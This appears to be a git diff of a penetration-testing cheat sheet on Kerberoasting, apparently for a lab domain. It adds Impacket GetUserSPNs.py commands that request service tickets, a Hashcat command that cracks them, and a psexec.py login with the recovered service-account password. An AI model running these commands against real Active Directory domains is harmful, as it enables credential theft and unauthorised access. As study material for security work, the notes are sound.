@@ -12,10 +12,13 @@
 
 ### How to Kerberoast [simple]
 
-- With access look for the supported SPNs and get TGS ticket for the SPN using GetUserSPNs tool from Impacket
+- With access look for supported SPNs and get TGS ticket for the SPN using GetUserSPNs tool from Impacket
 
 ```
 GetUserSPNs.py -request -dc-ip <DC_IP> <domain\user>
+
+sudo python3 GetUserSPNs.py BASEJUMP.local/rfeynman:Password -dc-ip $ip -request
+
 ```
 
 - Crack hash
@@ -24,7 +27,7 @@ GetUserSPNs.py -request -dc-ip <DC_IP> <domain\user>
 Hashcat -m 13100 <hash_file> <wordlist>
 ```
 
-#### Grab krb5tgs
+- Use psexec.py to login
 ```
-sudo python3 GetUserSPNs.py BASEJUMP.local/rfeynman:Password -dc-ip $ip -request
+psexec.py BASEJUMP.local/svc_tgs:helloworldpassword@IP
 ```
